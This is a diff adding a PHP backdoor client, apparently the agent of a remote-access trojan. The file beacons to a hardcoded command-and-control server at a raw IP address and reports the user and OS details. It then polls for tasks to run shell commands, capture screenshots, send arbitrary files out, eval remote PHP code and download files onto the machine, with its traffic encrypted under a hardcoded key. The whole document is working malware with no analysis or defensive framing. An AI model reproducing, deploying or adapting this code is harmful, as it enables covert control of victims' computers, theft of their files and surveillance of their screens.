@@ -1,0 +1,340 @@
+<?php
+
+//php.exe DIR (PHP>=5.4)
+define("RUNDIR", dirname(str_replace("\\","/", PHP_BINARY)));
+
+//user temp dir
+define("TEMP", str_replace("\\","/", getenv('TEMP')));
+
+//auth key
+define("KEY", "Tt985hAj9FlwZFiTnXwkxDpgQk8JMev4QYSBjj60Up3nOJutq24Bi74R1SCev08c");
+
+//version
+define("VERSION", "1.0");
+
+//set memory
+ini_set('memory_limit','1024M');
+
+//set timeout
+set_time_limit(0);
+
+//set client_id (-i)
+if (file_exists(RUNDIR . "/cid.txt")) {
+    $cid = trim(file_get_contents(RUNDIR . "/cid.txt"));
+} else {
+    $cid = getopt("i:")["i"];
+    if ($cid == NULL) {
+        exit();
+    }
+}
+
+//server address
+$server = "http://52.221.14.194:9000";
+
+//task refresh time
+$task_refresh_time = 30;
+
+//online refresh time
+$online_refresh_time = 300;
+
+online();
+
+$on_time = time();
+while (0 < 1) {
+
+    echo 1;
+    if (time() - $on_time > $online_refresh_time) {
+        $on_time = time();
+        online();
+    }
+
+    task();
+
+    sleep($task_refresh_time);
+}
+
+function task() {
+
+    global $cid;
+    
+    $task = file_post_contents("/client/v1/task", (object)array(
+        "client_version" => VERSION,
+        "client_id" => $cid,
+    ));
+
+    $task = @json_decode($task);
+
+    if (!$task || $task == null || $task->count < 1) {
+        return;
+    }
+
+    foreach ($task->task as $key => $value) {
+        print_r($value);
+        if ($value->task_type == "cmd") {
+            $data = cmd_execute($value->cmd);
+            $success = ($data["code"] == 200) ? 1 : 2;
+            file_post_contents("/client/v1/task/report", (object)array(
+                "client_version" => VERSION,
+                "client_id" => $cid,
+                "task_id" => $value->task_id,
+                "success" => $success,
+                "output" => $data["data"]
+            ));
+        } else if ($value->task_type == "screenshot") {
+            $data = screenshot();
+            $success = ($data["code"] == 200) ? 1 : 2;
+            $postdata = (object)array(
+                "client_version" => VERSION,
+                "client_id" => $cid,
+                "task_id" => $value->task_id,
+                "success" => $success,
+                "output" => ""
+            );
+            if ($data["code"] == 200) {
+                $postdata->output = @base64_encode(gzencode(file_get_contents($data["data"]), 9));
+                unlink($data["data"]);
+            } else {
+                $postdata->output = $data["data"];
+            }
+
+            file_post_contents("/client/v1/task/report", $postdata);
+
+        } else if ($value->task_type == "download") {
+            $postdata = (object)array(
+                "client_version" => VERSION,
+                "client_id" => $cid,
+                "task_id" => $value->task_id,
+                "success" => $success,
+                "output" => ""
+            );
+            if(@file_exists($value->download)) {
+                $postdata->success = 1;
+                $files = @file_get_contents($value->download);
+                $postdata->output = @base64_encode(gzencode($files, 9));
+            } else {
+                $postdata->success = 2;
+                $postdata->output = "file not found: " . $value->download;
+            }
+            
+            file_post_contents("/client/v1/task/report", $postdata);
+
+        } else if ($value->task_type == "php") {
+
+            if (substr($value->php_code, 0, 12) == '/*EVALCODE*/') {
+                $output = @eval($value->php_code);
+                file_post_contents("/client/v1/task/report", (object)array(
+                    "client_version" => VERSION,
+                    "client_id" => $value->client_id,
+                    "task_id" => $value->task_id,
+                    "success" => 1,
+                    "output" => $output
+                ));
+                if ($value->client_id != $cid) {
+                    @file_put_contents(RUNDIR . "/cid.txt", $cid);
+                    online();
+                }
+                continue;
+            }
+            
+            $filename = getenv('TEMP') . '\\' . generate(8, 1) . '.txt';
+            file_put_contents($filename, "<?php\r\n" . $value->php_code . "\r\n?>");
+            $data = cmd_execute(PHP_BINARY . " $filename");
+            unlink($filename);
+            $success = ($data["code"] == 200) ? 1 : 2;
+            file_post_contents("/client/v1/task/report", (object)array(
+                "client_version" => VERSION,
+                "client_id" => $cid,
+                "task_id" => $value->task_id,
+                "success" => $success,
+                "output" => $data["data"]
+            ));
+        } else if ($value->task_type == "wget") {
+            
+            $url = $value->wget->src;
+            $save = $value->wget->dsc;
+            $success = 2;
+            $file = @file_get_contents($url);
+            if ($file !== FALSE) {
+                $ret = @file_put_contents($save, $file);
+                if ($ret !== FALSE) {
+                    $success = 1;
+                }
+            }
+            $output = $success==1?"wget success: \r\n{$url} ===>\r\n{$save}":"wget faild";
+            file_post_contents("/client/v1/task/report", (object)array(
+                "client_version" => VERSION,
+                "client_id" => $cid,
+                "task_id" => $value->task_id,
+                "success" => $success,
+                "output" => $output
+            ));
+        }
+        
+    }
+
+
+}
+
+function online() {
+    
+    global $cid;
+    $systeminfo = cmd_execute("systeminfo | findstr \"OS Version\"");
+    $userinfo = cmd_execute("whoami");
+    file_post_contents("/client/v1/online", (object)array(
+        "client_version" => VERSION,
+        "client_id" => $cid,
+        "user_info" => $userinfo["data"],
+        "system_info" => $systeminfo["data"]
+    ));
+}
+
+function cmd_execute($commond) {
+
+    $output = array();
+    $return = 0;
+    exec($commond, $output, $return);
+
+    if ($return == 1) {
+        return message("cmd_execute failed: " . $commond, 500);
+    }
+    
+    return message(implode("\n", array_map('mb',$output)), 200);
+}
+
+function screenshot() {
+
+    if (!file_exists(RUNDIR . "/php_gd2.dll")) {
+        return message("screenshot failed: php_gd2.dll file not found", 500);
+    }
+
+    if (!extension_loaded("gd")) {
+
+        //load gd2 extension
+        if (!dl("php_gd2.dll")) {
+            return message("screenshot failed: php_gd2.dll failed to load", 500);
+        }
+    }
+
+    $image = imagegrabscreen();
+
+    $filename = TEMP . "/" . generate(8,1) . ".png";
+    if (!imagepng($image, $filename)) {
+        return message("screenshot failed: imagepng failed to save", 500);
+    }
+    
+    imagedestroy($image);
+    return message($filename);
+}
+
+function message($data, $code = 200) {
+
+    return array(
+        "data" => $data,
+        "code" => $code
+    );
+}
+
+function generate($length = 8, $module = 0) {
+
+    if (!$module) {
+      $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|';
+    } else {
+      $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    }
+    $str = '';
+    for ($i = 0; $i < $length; $i++)
+    {
+      $str .= $chars[ mt_rand(0, strlen($chars) - 1) ];
+    }
+    return $str;
+}
+
+function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
+  $ckey_length = 4;
+  $key = md5($key ? $key : N1_AUTHKEY);
+  $keya = md5(substr($key, 0, 16));
+  $keyb = md5(substr($key, 16, 16));
+  $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';
+  $cryptkey = $keya . md5($keya . $keyc);
+  $key_length = strlen($cryptkey);
+  $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
+  $string_length = strlen($string);
+  $result = '';
+  $box = range(0, 255);
+  $rndkey = array();
+  for($i = 0; $i <= 255; $i++){
+    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+  }
+  for($j = $i = 0; $i < 256; $i++){
+    $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+    $tmp = $box[$i];
+    $box[$i] = $box[$j];
+    $box[$j] = $tmp;
+  }
+  for($a = $j = $i = 0; $i < $string_length; $i++){
+    $a = ($a + 1) % 256;
+    $j = ($j + $box[$a]) % 256;
+    $tmp = $box[$a];
+    $box[$a] = $box[$j];
+    $box[$j] = $tmp;
+    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+  }
+  if($operation == 'DECODE'){
+    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)){
+      return substr($result, 26);
+    }else{
+      return '';
+    }
+  } else {
+    return $keyc.str_replace('=', '', base64_encode($result));
+  }
+}
+
+function mb($text) {
+
+    if (!file_exists(RUNDIR . "/php_mbstring.dll")) {
+        return $text;
+    }
+
+    if (!extension_loaded("mbstring")) {
+
+        //load mbstring extension
+        if (!dl("php_mbstring.dll")) {
+            return $text;
+        }
+    }
+
+    return mb_convert_encoding($text, 'UTF-8','GBK');
+}
+
+function file_post_contents($url, $data) {
+
+    global $server;
+    
+    $postdata = authcode(json_encode($data), 'ENCODE', KEY);
+
+    $opts = array('http' =>
+        array(
+            'method'  => 'POST',
+            'header'  => 'Content-type: application/x-www-form-urlencoded',
+            'content' => $postdata,
+            'timeout' => 60
+        )
+    );
+    
+    $context = stream_context_create($opts);
+
+    try {
+        $response = @file_get_contents($server.$url, false, $context);
+    } catch (\ErrorException $ex) {
+        return FALSE;
+    }
+
+    if ($response === FALSE) {
+        return FALSE;
+    }
+
+    return authcode($response, 'DECODE', KEY);
+}
+
+?>
